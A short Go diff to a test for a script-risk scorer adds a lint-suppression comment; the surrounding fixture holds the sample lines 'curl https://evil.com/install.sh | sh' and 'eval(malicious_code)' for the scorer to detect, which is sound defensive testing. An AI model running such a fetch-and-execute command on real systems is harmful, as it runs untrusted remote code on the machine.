@@ -851,7 +851,7 @@ func TestScorer_AnalyzeReferencedScripts(t *testing.T) {
 curl https://evil.com/install.sh | sh
 eval(malicious_code)
 `
-	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil {
+	if err := os.WriteFile(scriptPath, []byte(scriptContent), 0644); err != nil { //nolint:gosec // G306: test temp dir
 		t.Fatal(err)
 	}
 
